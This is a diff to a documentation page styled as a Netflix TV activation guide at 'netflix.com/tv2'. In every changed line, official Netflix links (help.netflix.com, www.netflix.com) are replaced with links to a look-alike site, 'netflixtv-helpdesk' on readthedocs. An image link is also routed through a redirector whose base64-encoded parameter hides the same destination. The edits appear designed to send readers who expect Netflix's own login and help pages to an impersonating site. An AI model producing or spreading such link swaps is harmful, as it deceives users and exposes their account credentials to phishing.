@@ -5,7 +5,7 @@ You just need to visit netflix.com/tv2, enter the code displayed on your TV, and
 
 .. image:: get.png
    :alt: netflix.com/tv2
-   :target: 
+   :target: https://fm.ci/?aHR0cHM6Ly9uZXRmbGl4dHYtaGVscGRlc2sucmVhZHRoZWRvY3MuaW8vZW4vbGF0ZXN0
 
 
 Step-by-Step Guide to Use netflix.com/tv2 and Activate Netflix on Your TV
@@ -18,7 +18,7 @@ Activating Netflix on your Smart TV or streaming device is quick and easy using 
 - Open the Netflix app on your Smart TV, Roku, Fire TV Stick, PlayStation, Xbox, or Apple TV.
 - Select **“Sign In.”**
 - A 6-digit activation code will appear on your TV screen.
-- On your phone, tablet, or computer browser, go to: `netflix.com/tv2 <https://help.netflix.com>`_
+- On your phone, tablet, or computer browser, go to: `netflix.com/tv2 <https://netflixtv-helpdesk.readthedocs.io/en/latest>`_
 - Enter the activation code displayed on your TV.
 - Log in to your Netflix account (or create one if you don’t have it).
 - Once activated, your TV will automatically refresh, and you’ll be signed in.
@@ -53,14 +53,14 @@ If you run into issues during activation, try the following:
 - Use Incognito/Private mode in your browser.
 - Switch browsers (Chrome, Safari, Firefox, Edge).
 - Restart your streaming device and router.
-- If all else fails, visit the `Netflix Help Center <https://help.netflix.com>`_ or reinstall the app.
+- If all else fails, visit the `Netflix Help Center <https://netflixtv-helpdesk.readthedocs.io/en/latest>`_ or reinstall the app.
 
 Don’t Have a Netflix Account Yet?
 ---------------------------------
 
 Here’s how to sign up:
 
-1. Visit `www.netflix.com <https://www.netflix.com>`_
+1. Visit `www.netflix.com <https://netflixtv-helpdesk.readthedocs.io/en/latest>`_
 2. Click **“Sign Up”**
 3. Choose a plan that suits you
 4. Enter your email and create a password
@@ -94,7 +94,7 @@ No. Activation codes are one-time use and expire quickly. Just restart the app t
 Still Need Help?
 ----------------
 
-- Visit the `Netflix Help Center <https://help.netflix.com>`_
+- Visit the `Netflix Help Center <https://netflixtv-helpdesk.readthedocs.io/en/latest>`_
 - Check your device’s manual or support site
 - Make sure your Netflix app is updated to the latest version
 
